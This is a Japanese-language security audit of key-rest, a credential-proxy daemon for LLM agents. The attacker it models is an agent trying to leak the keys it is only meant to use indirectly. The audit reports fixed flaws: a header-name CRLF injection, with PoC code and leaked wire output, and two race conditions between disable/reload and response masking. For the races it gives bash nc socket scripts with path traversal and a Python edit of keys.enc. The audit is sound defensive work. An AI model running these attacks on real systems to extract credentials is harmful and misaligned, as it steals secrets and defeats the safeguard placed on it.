[English](audit-speca.md) | [Japanese](audit-speca-ja.md)

# key-rest の SPECA メソドロジーによるセキュリティ監査

[SPECA](https://github.com/NyxFoundation/speca) フレームワークのメソドロジーを用いた key-rest の構造化セキュリティ監査記録。仕様 (CLAUDE.md, README, 脅威モデル) から形式的プロパティを導出し、実装に対して proof-attempt 監査を行う。発見は PoC で確認してから報告。

## 監査サマリ

- **Subgraphs (機能単位):** 9 件 — SG-001 〜 SG-009
- **監査済みプロパティ:** 30 件 — P-001 〜 P-030
- **Findings:** 3 件、全て修正済み
- **追加 hardening (F-xxx ではない):** outbound リクエストから `Transfer-Encoding` を除去 (commit `4b7bc94`)。
- **Defense-in-depth で未適用の follow-up:** `disable` / `reload` socket コマンドの認証、`mlock` 失敗時の fail-closed 化、socket scanner のコネクション毎 read deadline。

### Findings 一覧

| ID | タイトル | Severity | 修正 commit | ハッキングチャレンジ突破? |
|---|---|---|---|---|
| F-001 | Header Key CRLF Injection | HIGH | `0ed5257` | ✅ **不可** — チャレンジ環境では全キーが `--allow-only-*` で登録されているため、悪意のあるヘッダ名は配置チェックで拒否される (`strings.EqualFold("Authorization", "Authorization\r\nLog-Echo")` が false)。脆弱性自体は本物だが、legacy モード (`--allow-only-*` なしの `key-rest add` のデフォルト) で動く daemon に対してのみ悪用可能。 |
| F-002 | Disable/Mask Race Condition | CRITICAL | `788937c` | 🚨 **可** — 攻撃が配置ポリシーに依存しないため、チャレンジ構成 (modern `--allow-only-*` キー) でも動く。Validation は正常に通り、agent が in-flight リクエストに対して `disable` socket コマンドを race させる。レスポンス masker は mask 実行時に live keystore を読むため、now-disabled なキーをスキップする。Localhost 自然 timing の PoC は fix 前で 173 / 200 試行勝利。 |
| F-003 | Reload + `keys.enc` 改竄 Race | CRITICAL | `788937c` | 🚨 **可** — F-002 と同じ論理 race を master passphrase なしで実現。Agent が `keys.enc` から target エントリを削除 (JSON 編集) し、認証なし socket の `reload` を発火させる。配置ポリシーに依存しないため、チャレンジ環境で突破可能。 |

## バグバウンティスコープ

| 項目 | 定義 |
|---|---|
| 攻撃者モデル | key-rest クライアントライブラリ経由で Unix socket に任意の JSON リクエストを送信する LLM agent |
| 対象外 | daemon プロセスメモリの読み取り (`PR_SET_DUMPABLE=0`)、`keys.enc` 読み取り (パーミッション 0600)、root ユーザ、daemon バイナリ改竄 |
| 対象エントリポイント | (1) Unix socket プロトコル (JSON-over-newline)、(2) 外部サービスからの HTTP/HTTPS レスポンス |
| 目標 | `DecryptedKey.Value` の生バイトを agent に漏洩させる |

## 機能単位 (Subgraphs)

| ID | Unit | Source |
|---|---|---|
| SG-001 | REQUEST-DISPATCH | `internal/server/server.go` |
| SG-002 | PROXY-VALIDATE   | `internal/proxy/proxy.go::validateField` |
| SG-003 | URI-PARSE        | `internal/uri/uri.go::FindAll` |
| SG-004 | URI-RESOLVE      | `internal/uri/uri.go::ReplaceBytes` |
| SG-005 | HTTP-PROXY       | `internal/proxy/sectransport.go::RoundTrip` |
| SG-006 | RESP-MASK        | `internal/proxy/proxy.go::maskCredentials` 等 |
| SG-007 | KEY-MGMT         | `internal/keystore/keystore.go::Add/Disable/Enable` |
| SG-008 | DAEMON-START     | `internal/daemon/daemon.go::Start` |
| SG-009 | CRYPTO           | `internal/crypto/crypto.go` |

## 監査したプロパティ

STRIDE 分析 (Phase 01e メソドロジー) で導出。credential 漏洩経路に絞った。

| ID | プロパティ | Subgraph | 結果 |
|---|---|---|---|
| P-001 | 復号化された credential バイトは、配置ポリシーで許可された field のみに wire 上に現れる。 | SG-005 | 🚨 **違反 → F-001** (legacy モードのみ) |
| P-002 | URL request line は CRLF / 制御文字を含まない。 | SG-005 | 成立 (Go `url.Parse` が拒否)。 |
| P-003 | HTTP method は RFC 7230 の有効な token である。 | SG-005 | 成立 (Go `http.NewRequest` が拒否)。 |
| P-004 | `validateField` は keystore に対するいかなる URI 解決の前に呼ばれる。 | SG-002 | 成立 (`proxy.go:133-145` で確認)。 |
| P-005 | `url_prefix` 境界チェックがサブドメイン攻撃を防ぐ。 | SG-002 | 成立 (`hasURLPrefix` は prefix 後に `/`, `?`, `#`, または終端を要求)。 |
| P-006 | userinfo 付き URL (`https://...@evil.com/`) は拒否される。 | SG-002 | 成立 (`proxy.go:121`)。 |
| P-007 | パストラバーサル `/../` は拒否される。 | SG-002 | 🚨 リテラル `/../` には成立。**percent-encoded `/%2e%2e/` はバイパス可能** (F-002 の踏み台)。 |
| P-008 | 平文 HTTP は拒否される。 | SG-002 | 成立 (`proxy.go:115`)。 |
| P-009 | TLS dial 失敗時に解決済みバッファがゼロクリアされる。 | SG-005 | 成立 (`sectransport.go:182`)。 |
| P-010 | `maskCredentials` が知っている credential 集合は、wire に書かれた credential 集合と一致する。 | SG-006 | 🚨 **違反 → F-002 / F-003** (resolution と masking の間に `s.decrypted` を変える操作 — `Disable` または on-disk 編集後の `Reload` — は credential を masker の集合から外す)。 |
| P-011 | `disable` / `enable` / `reload` / `list` socket コマンドは特権呼び出し元のみがアクセスできる。 | SG-001 | 🚨 違反 (認証なし、agent が全て呼べる)。F-002 と F-003 で必要。 |
| P-012 | `keys.enc` の整合性は master passphrase なしには破壊できない。 | SG-007 | 🚨 **部分的に違反**: エントリ削除 (素の JSON 編集) は passphrase 不要。F-003 で必要。 |
| P-013 | Agent 提供の `Transfer-Encoding` が daemon 追加の `Content-Length` と並んで wire に出ない。 | SG-005 | 成立 (commit `4b7bc94`: `secureTransport.RoundTrip` でstrip)。Regression: `bodysmuggle_poc_test.go::TestTransferEncodingStrippedFromWire`。 |
| P-014 | `validateField` に対する `Disable` の race は agent に credential バイトを漏洩させない。 | SG-002 | 成立 — fix 後はリクエストが拒否される (KEY_DISABLED) か、validation 時の snapshot でレスポンスが mask される。Regression: `bodysmuggle_poc_test.go::TestValidationRaceDoesNotLeak`。 |
| P-015 | `enable` / `list` / `version` socket コマンドは credential VALUE を返さない。 | SG-001 | 成立 — `list` は `KeyStatus` (URI / URLPrefix / placement / Disabled、Value なし) を返し、`enable` は count を、`version` は version 文字列を返す。 |
| P-016 | Socket リクエストサイズに上限があり、無制限のメモリ確保を防ぐ。 | SG-001 | 成立 (`server.go::maxRequestSize = 10 MB`)。 |
| P-017 | Socket は同時接続数を制限して fd 枯渇を防ぐ。 | SG-001 | 成立 (`server.go::maxConcurrentConns = 64`)。 |
| P-018 | URI parser の正規表現は catastrophic backtracking しない。 | SG-003 | 成立 (Go `regexp` は RE2 で線形; `uri.go` のパターンも線形)。 |
| P-019 | `uri.ReplaceBytes` のサイズ計算がオーバーフローしない。 | SG-004 | 成立 — サイズは agent 提供のリクエストサイズ (≤ `maxRequestSize`) で上限が抑えられ、64-bit ホストでは `int` で十分。 |
| P-020 | `Add` と `Remove` は agent 向け socket 経由で呼べない。 | SG-007 | 成立 — `server.go` の switch は `reload` / `enable` / `disable` / `list` / `version` / `http` のみを公開。 |
| P-021 | `DecryptAll` 失敗時 keystore は consistent state に保たれる。 | SG-008 | 成立 — 失敗時は `clearDecrypted` で部分的な新スライスをゼロクリアし、`s.decrypted` を変更せずに error を返す。 |
| P-022 | `PR_SET_DUMPABLE=0` を適用できない場合 daemon は起動しない。 | SG-008 | 成立 (`daemon.go:86-88` で error を返す)。 |
| P-023 | Master passphrase は daemon 実行中 mlock され、shutdown 時にゼロクリアされる。 | SG-008 | 成立 (`daemon.go:97-98` で mlock; `daemon.go:167` で `ZeroClearAndMunlock`)。 |
| P-024 | AES-256-GCM の nonce は `Encrypt` 呼び出しごとに一意。 | SG-009 | 成立 — `crypto.go:53-56` で暗号化のたびに `crypto/rand` から 12 バイトの fresh nonce を読み出す。 |
| P-025 | PBKDF2 の salt は `Encrypt` 呼び出しごとに一意。 | SG-009 | 成立 — `crypto.go:34-37` で暗号化のたびに 16 バイトの fresh salt を読み出すため、master passphrase が同じでも各エントリの導出鍵は独立。 |
| P-026 | PBKDF2 のイテレーション回数は現行の OWASP ガイダンス (SHA-256 で 600,000 以上) を満たす。 | SG-009 | 成立 (`crypto.go:21::PBKDF2Iter = 600_000`)。 |
| P-027 | `Decrypt` は「パスフレーズ間違い」と「ciphertext 改竄」を区別しない不透明なエラーを返す。 | SG-009 | 成立 (`crypto.go:95::"decryption failed: wrong passphrase or corrupted data"`)。 |
| P-028 | `Mlock` 失敗時に daemon 起動を中止する。 | SG-009 | 🚨 **Soft-fail**: `crypto.Mlock` は warning を出すだけで継続。`RLIMIT_MEMLOCK` が低いと復号済み credential が swap される可能性。Agent への credential exfil 経路はないため scope 外だが、fail-closed への変更が望ましい。 |
| P-029 | 外向き TLS ハンドシェイクは TLS &lt; 1.2 を拒否する。 | SG-005 | 成立 — Go ≥ 1.20 のクライアント default `MinVersion` が TLS 1.2 で、daemon はそれを下げていない。 |
| P-030 | `crypto.ZeroClear` は Go コンパイラに最適化で削除されない。 | SG-009 | 実用上成立 (slice が引数として escape するため write が dead でない)。将来のコンパイラ変更に備えて `runtime.KeepAlive` で守るのが defensive だが、現 scope 外。 |

---

## F-001 — Header Key CRLF Injection (HIGH)

### 概要
`secureTransport.RoundTrip` の CRLF チェックは header **値** にのみ適用され、header **キー** には適用されない。リクエストヘッダを制御できる攻撃者は、ヘッダ名に `\r\n` を埋め込むことで wire リクエストに任意のヘッダを注入できる。Legacy モード (`--allow-only-*` なしの `key-rest add` のデフォルト) と組み合わせると、credential 値を attacker-named ヘッダで送出 TLS リクエストに配置できる。

### コード参照

`internal/proxy/sectransport.go:107-117`
```go
// Reject CRLF injection in resolved header values
if containsCRLF(resolved) {
    ...
    return nil, fmt.Errorf("CRLF injection detected in header %s", key)
}
resolvedHeaders = append(resolvedHeaders, resolvedHeader{key, resolved})
```

チェックは `resolved` (値) のみ。`key` (ヘッダ名) はそのまま append される。

`internal/proxy/sectransport.go:150-154`
```go
for _, h := range resolvedHeaders {
    n += copy(buf[n:], h.key)        // raw write — 検証なし
    n += copy(buf[n:], ": ")
    n += copy(buf[n:], h.value)
    n += copy(buf[n:], "\r\n")
}
```

`h.key` は mlock されたバッファにそのまま書き込まれ、TLS 経由で送信される。

Go の `http.Header.Set` は `textproto.CanonicalMIMEHeaderKey` を呼ぶが、これは入力に non-token バイトが含まれる場合 (`validHeaderFieldByte` で false) は変更せず返す。よって `\r\n` を含むキーは `Set` を生き延び、raw HTTP builder に届く。

### 再現

PoC テスト: `internal/proxy/headerinject_poc_test.go::TestHeaderKeyInjectionRawWire`

```go
store.Add("user1/ts/key", "https://localhost/",
    false, false, nil, []byte("SUPER-SECRET-CREDENTIAL-XYZ"), pass)
// ...
p.Handle(&Request{
    Type: "http", Method: "GET", URL: "https://localhost/",
    Headers: map[string]string{
        "Authorization\r\nLog-Echo": "Bearer key-rest://user1/ts/key",
    },
})
```

リスナで復号した raw TLS ペイロード:
```
GET / HTTP/1.1
Host: localhost
Connection: close
Authorization
Log-Echo: Bearer SUPER-SECRET-CREDENTIAL-XYZ

```

credential `SUPER-SECRET-CREDENTIAL-XYZ` が `Log-Echo` という、daemon の配置ポリシーが認可していないヘッダに入っている。

### 攻撃成立条件

1. **Legacy モード** (デフォルト — `--allow-only-*` フラグなし) で登録された daemon キー。または、`--allow-only-header X` で agent が注入キーの正規部分として正確に `X` を使うパターン。
2. 注入されたヘッダ値を取り戻す方法。少なくとも以下のいずれか:
   - **Malicious upstream**: 攻撃者が key の `url_prefix` にマッチするサーバを制御。upstream のリクエストログから credential を読む。
   - **共有インフラ**: upstream が全受信ヘッダを攻撃者の読める場所 (CDN ログ、debug エンドポイント、ヘッダをエコーするエラーレスポンス、サポートチケットのリクエストダンプ) に転送・記録する。
   - **Intermediary 混乱**: upstream の前段にあるプロキシや WAF が分割されたリクエストを upstream と異なる解釈し、credential が攻撃者の読めるインフラにルーティングされる。

PoC は (1) と (2-malicious-upstream) を legacy モードのデフォルト下で示す。

以下では緩和されない:
- レスポンスボディ credential マスキング (`maskCredentials`) — credential は daemon がパースするレスポンスには現れず、upstream 側の別チャネルで daemon を離れる。
- `url_prefix` チェック — リクエストは正規 URL に送られる。乗っ取られるのは *リクエスト内の credential の位置* のみ。
- TLS — credential は転送中は暗号化されるが upstream で平文になる。

### Severity

**HIGH** (SPECA / Sherlock 基準): 一つの攻撃者リクエストで、upstream が攻撃者制御または攻撃者の読めるストレージとヘッダを共有する場合に直接 credential を漏洩できる。攻撃はリプレイ可能、特殊なタイミング不要、デフォルト設定で動作する。

### 修正案

解決前に RFC 7230 の有効な token でないヘッダ名を拒否する。次のいずれか:

```go
// Option A: キーの CRLF を拒否 (最低限の修正)
if containsCRLF([]byte(key)) {
    crypto.ZeroClear(resolvedBody)
    crypto.ZeroClear(resolvedURI)
    return nil, fmt.Errorf("CRLF injection detected in header name %q", key)
}

// Option B: 完全な RFC 7230 token 検証 (推奨)
for _, c := range []byte(key) {
    if !isValidHeaderNameByte(c) {
        return nil, fmt.Errorf("invalid character in header name %q", key)
    }
}
```

同じチェックは URI 解決の前、`proxy.Handle` の段階でも適用すべき。

### Status

**Commit `0ed5257` で修正済み。** `Proxy.Handle` は URI 解決の前に RFC 7230 token でないヘッダ名を拒否するようになった (`internal/proxy/sectransport.go` の `isValidHeaderName`)。Regression: `internal/proxy/headerinject_poc_test.go::TestHeaderKeyInjectionRejected`。

---

## F-002 — Disable/Mask Race Condition (CRITICAL)

### 概要
`maskCredentials` は `Value` が nil のキー (`Disable` で設定される状態) をスキップする。HTTP リクエストと `disable` コマンドを並列で発行できる攻撃者は、resolution (credential が wire に乗る時点) と response masking の間の window に disable を割り込ませられる。disable 後に masker が動作すると、レスポンスボディに現れた credential バイトが認識されず、agent にそのまま返される。

### コード参照

`internal/proxy/proxy.go:443-471`
```go
func (p *Proxy) maskCredentials(s string) string {
    p.store.RLock()
    decrypted := p.store.Decrypted()
    p.store.RUnlock()
    ...
    for _, dk := range sorted {
        if len(dk.Value) > 0 {        // disabled キー (nil Value) はスキップ
            ...
            s = strings.ReplaceAll(s, raw, replacement)
        }
    }
    return s
}
```

`internal/keystore/keystore.go:330-344`
```go
func (s *Store) Disable(uriPrefix string) int {
    s.mu.Lock()
    defer s.mu.Unlock()
    ...
    crypto.ZeroClearAndMunlock(s.decrypted[i].Value)
    s.decrypted[i].Value = nil
    s.decrypted[i].Disabled = true
}
```

`internal/server/server.go:160-162`
```go
case "disable":
    s.handleEnableDisable(conn, line, false)
```

`disable` socket コマンドは認証なし — socket にアクセスできる任意のプロセス (= agent) が発行できる。

### Race window

`proxy.Handle` (`internal/proxy/proxy.go:109-214`) は `validateField` (`store.Lookup` 経由で `dk` を取得) と `maskCredentials` の間ロックを保持しない。具体的には:

1. Agent が HTTP リクエスト送信 → `validateField` 成功 (キーは enabled)。
2. Daemon が credential を wire バッファにコピーし、TLS リクエストを送信。
3. **Daemon は upstream の応答を待つ (ロック未保持)。**
4. Daemon がレスポンスを読み込む。
5. Daemon が `maskCredentials` を呼ぶ (read lock を取り `s.decrypted` を読む)。

(2) と (5) の間で `Disable()` が走ると、(5) は target キーの `Value == nil` を見て masking をスキップする。

### 再現

PoC テスト `internal/proxy/raceattack_poc_test.go`:

- `TestDisableMaskRacePoC` — race window を意図的に広げる artificial mutex 版。常に勝利。漏洩の論理的存在を確認。
- `TestDisableMaskRaceMultipleAttempts` — localhost の自然なネットワーク timing で 200 試行。**173/200 (≈86.5%) 勝利** — credential バイトが unmasked でレスポンスボディに現れる。

Agent 側の wire-level 攻撃:

```bash
SOCKET=~/.key-rest/key-rest.sock

(
  printf '{"type":"http","method":"GET","url":"https://localhost:9443/openai/%%2e%%2e/echo/x",'
  printf '"headers":{"Authorization":"Bearer key-rest://user1/openai/api-key"}}\n'
  cat
) | nc -U "$SOCKET" > response.json &

sleep 0.0001
echo '{"type":"disable","uri_prefix":"user1/"}' | nc -U "$SOCKET" >/dev/null
wait
# response.json: {"headers":{"Authorization":"Bearer <RAW_CREDENTIAL>"}, ...}
```

`/openai/%2e%2e/echo/` の path traversal セグメントにより、`https://localhost:9443/openai/` プレフィックスのキーで test-server の `/echo/` reflector に到達できる: proxy のプレフィックスチェックは生の URL 文字列 (まだ `/openai/` から始まる) を見るが、upstream 側の Go `http.ServeMux` は `r.URL.Path` を `/openai/../echo/x` から `/echo/x` に正規化する。reflector は resolved 済みの `Authorization` ヘッダをレスポンスボディにそのまま返す。

### Severity

**CRITICAL**。チューニングなしの localhost で1回試行あたり成功確率 ≈86%。デフォルト daemon 設定で十分; 特殊なキーオプションも upstream の協力も不要 (反射エンドポイントは bundled test-server (`/echo/`) で満たされ、任意のサービスプレフィックスから path traversal で到達可能)。keystore に何らかのプレフィックスが存在する限りリプレイ可能。

### 修正

二つの相補的な変更:

1. **Validation 時に credential バイトをスナップショット**し、レスポンスを mask する際にそのスナップショットを使う — リクエストが daemon を離れた後に `s.decrypted` を再読み込みしない。`Proxy.Handle` フローで validation 中に `[]keyMask{ uri, value }` リストを構築し (この時点で既に mlocked メモリにある)、masker に明示的に渡せばよい。
2. **`disable` socket コマンドを認証する、または agent 向けプロトコルから除去する**。Agent には keys を disable する正当な理由がない; これは admin 操作。別の admin socket (または public socket を絶対に開かない CLI 専用パス) にすれば攻撃面が消える。

どちらの変更単独でも F-002 を塞ぐ。両方が推奨。

### Status

**Commit `788937c` で修正済み。** 変更 (1) を実装: `Proxy.snapshotCredentials` が validation 時に復号済み credential をすべてコピー (mlock) し、`maskCredentials` / `maskTruncatedKeys` / `maskPercentEncoded` は live keystore ではなくこのスナップショットを使う。Resolution 後の `disable` が masker の集合から credential を除去できなくなった。変更 (2) (`disable` socket コマンドの認証) は defense-in-depth の follow-up として残置。Regression: `internal/proxy/raceattack_poc_test.go::TestDisableDuringRequestDoesNotLeak` および `TestDisableDuringRequestNaturalTimingDoesNotLeak`。

---

## F-003 — Reload + `keys.enc` 改竄 Race (CRITICAL)

### 概要
F-002 と同じ論理 race を別の state mutation 経路で実現。Agent が disk 上の `keys.enc` から target エントリを削除 (JSON 編集; master passphrase 不要) し、認証なしの `reload` socket コマンドを発火させる。Reload は残ったエントリのみを再復号化するため、in-memory の `s.decrypted` から target credential が消える。In-flight リクエストのレスポンスが masking されるとき、credential バイトが認識されずそのまま漏洩する。

### Master passphrase が不要な理由

`keys.enc` は daemon ユーザ所有 (mode 0600) の JSON ファイル。Agent は (challenge の脅威モデル上) 同じユーザで動くため、このファイルへ完全なリード/ライトアクセスを持つ。暗号化は credential VALUE のみを保護しており、エントリ全体 (URI + URLPrefix + EncryptedValue) を削除するのに暗号操作は不要 — 単なる JSON 編集。Reload (`store.DecryptAll`) はファイル中のエントリのみを iterate するため、削除されたエントリは単純に消える。

### 再現

PoC テスト `internal/proxy/raceattack2_poc_test.go::TestReloadMaskRacePoC` — 漏洩を確認。

Wire-level 攻撃:

```bash
SOCKET=~/.key-rest/key-rest.sock
KEYS=~/.key-rest/keys.enc

# 1. keys.enc を読み、target エントリを削除し、書き戻す。passphrase 不使用。
python3 -c '
import json, sys
data = json.load(open(sys.argv[1]))
data["keys"] = [k for k in data["keys"] if k["uri"] != "user1/target/key"]
json.dump(data, open(sys.argv[1], "w"))
' "$KEYS"

# 2. credential を反射する HTTP リクエストを送信
(
  printf '{"type":"http","method":"GET","url":"https://localhost:9443/openai/%%2e%%2e/echo/x",'
  printf '"headers":{"Authorization":"Bearer key-rest://user1/target/key"}}\n'
  cat
) | nc -U "$SOCKET" > response.json &

# 3. Reload を割り込ませる
sleep 0.0001
echo '{"type":"reload"}' | nc -U "$SOCKET" >/dev/null

wait
# response.json は credential を unmasked で含む
```

### F-002 との比較

| | F-002 (disable) | F-003 (reload + tamper) |
|---|---|---|
| 必要な権限 | socket access のみ | socket access **かつ** keys.enc 書き込み |
| Stealth | `list` がキーを `disabled=true` で表示 | 痕跡なし — reload 後はエントリ自体が消える |
| Daemon の復旧 | Agent または admin が `enable` 実行 | admin が daemon 再起動して元の `keys.enc` を再読み込みするまで戻らない (ファイルは恒久的に改竄される) |
| Master passphrase 必要 | No | No |

### Severity

**CRITICAL**、F-002 と同じ root cause。

### 修正

F-002 と同じ修正: validation 時に credential バイトをスナップショットし、live keystore state ではなくそのスナップショットに対して mask する。この単一の変更で F-002 と F-003 (および将来 `s.decrypted` を変更するあらゆる操作) を一度に塞げる。独立して、認証なしの `reload` socket コマンドも疑わしい — agent には再復号化を発火させる正当な理由がない。

### Status

**Commit `788937c` で修正済み。** F-002 と同じ snapshot 変更で同時に閉じた。Masker は validation 時のスナップショットを使うため、`keys.enc` 改竄後の `reload` が `s.decrypted` から credential を消しても、スナップショットには残る。Regression: `internal/proxy/raceattack2_poc_test.go::TestReloadAfterTamperDoesNotLeak`。

---

## チェックして悪用可能でなかったベクタ

| ベクタ | 結果 |
|---|---|
| URL CRLF 注入 (`https://host/path\r\nHeader: x`) | Go `net/url.Parse` で拒否 (`invalid control character in URL`)。 |
| Method CRLF (`"GET\r\nEvil: x"`) | Go `http.NewRequest` で拒否 (`invalid method`)。 |
| `Host` ヘッダ上書き | `secureTransport.go:94` で agent 提供の `Host` をスキップ。 |
| サブドメイン prefix 攻撃 (`https://api.example.com.evil.com/`) | `hasURLPrefix` が prefix 後に `/`, `?`, `#`, または終端を要求。 |
| `https://...@evil.com/` userinfo トリック | `proxy.go:121` で拒否。 |
| パストラバーサル `/../` | `proxy.go:128` で拒否。 |
| 平文 HTTP | `proxy.go:115` で拒否。 |
| Agent 提供の `Transfer-Encoding` によるボディスマグリング | wire builder で strip (commit `4b7bc94`)。Strip 前でも、smuggled な 2 番目のリクエストのレスポンスは agent に届かない (daemon は `Connection: close` で1リクエスト1レスポンス)。P-013 参照。 |
| `Disable` / `Reload` と `validateField` の race | Snapshot fix (commit `788937c`) で masker が validation 時の snapshot を使うため漏洩しない。P-014 参照。 |
| Socket への同時接続/巨大行による DoS | 対象外 (DoS は credential exfil ではない)。10 MB リクエスト上限と 64 コネクション上限で影響を bound。P-016 / P-017 参照。 |
| URI パーサの catastrophic backtracking | Go `regexp` は RE2 (線形時間)。P-018 参照。 |
| `s.decrypted` を変える操作と response masking の race (Disable, Reload, Disable→Enable→Disable 連打、複数並行 request 等) | Snapshot fix (commit `788937c`) により validation 時に取得した copy を mask に使う。`Add`/`Remove` は agent から socket 経由で呼べない (P-020)。 |
| Go immutable string による response mask 残骸 | 本プロジェクトの脅威モデル下では悪用不可 (`PR_SET_DUMPABLE=0` で同一ユーザの `/proc/PID/mem` 読取りもブロック)。Root やディスク forensics を脅威モデルに加える場合は `[]byte` ベースの mask 再実装が望ましい。詳細は [`docs/memory.md`](memory.md) §Phase 4。 |
| Socket scanner への slow-loris | DoS のみで bug-bounty スコープ外。コネクション毎の read deadline 追加が defense-in-depth として望ましい (P-017 で並行接続数自体は 64 で bound)。 |
| Snapshot mlock 圧迫 (slow request × 並行) | DoS のみ。`RLIMIT_MEMLOCK` 設定と request timeout 30s で bound。 |
| PID file race / multi-start race | 攻撃者は master passphrase なしには `key-rest start` できないため scope 外。 |
